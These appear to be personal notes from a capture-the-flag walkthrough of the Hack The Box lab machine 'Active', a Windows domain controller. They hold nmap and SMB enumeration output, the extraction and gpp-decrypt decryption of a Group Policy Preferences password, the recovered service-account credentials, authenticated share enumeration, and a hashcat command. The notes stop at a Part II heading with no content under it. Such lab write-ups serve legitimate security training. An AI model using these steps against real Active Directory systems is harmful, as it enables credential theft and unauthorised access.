## **Box Info::**
OS: Windows \
IP: 10.10.10.100

## **Skills learned::**
Windows
Active Directory
Kerberoasting
Powershell

### **Enumeratiion::**
nmap -p- -A -oN (-f to bypass FW) Activeports.txt ${IP}
dnsrecon -d 10.10.10.100 -r 10.0.0.0/8
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
        #find all nmap scripts to enum smb

```
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-25 01:07:00Z) #Make sure attack box is within 1min of this time.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? *** Nice target to try first ***
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
Host script results:
|_clock-skew: 23m05s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-25T01:07:55
|_  start_date: 2021-12-25T01:04:50

```

### **OSINT::**
+ https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage
+ 

### **Part 1::** 
```
smbclient -L \\\\Active\\                                                                             1 ⨯
Enter WORKGROUP\kali's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
        
smbclient \\\\Active\\Replication
      smb: \active.htb\Policies\> ls
      .                                   D        0  Sat Jul 21 06:37:44 2018
      ..                                  D        0  Sat Jul 21 06:37:44 2018
      {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
      {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018
      
 smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> more Groups.xml
      <?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

  smb: prompt off
  smb: resurse on
  smb: mget *
```
  # gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ :: GPPstillStandingStrong2k18
  
  **Creds::**
  active.htb/svc_tgs:GPPstillStandingStrong2k18
  
  enum4linux <ip> # gives smb share login access.
  smbmap -H <ip> # lists shares 
        smbmap -R <share name> -H <ip> -A <file> -q #quiet
   
  GetADUsers.py -all active.htb/svc_tgs -dc-ip <ip>
  
 Try smbmap again::
        smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H <ip>
        :: Now READ ONLY access to NETLOGON,Replication,SYSVOL,Users
         smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H <ip> -R Users #recursively list files in Users smb share 
 smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q
        cat user.txt :: 86d67d8ba232bb6a254aa4d10159e983 >hashsmb.txt
        hashcat hashsmb.txt /usr/share/wordlist/rockyou.txt
        
**Part II: Bloodhound::**
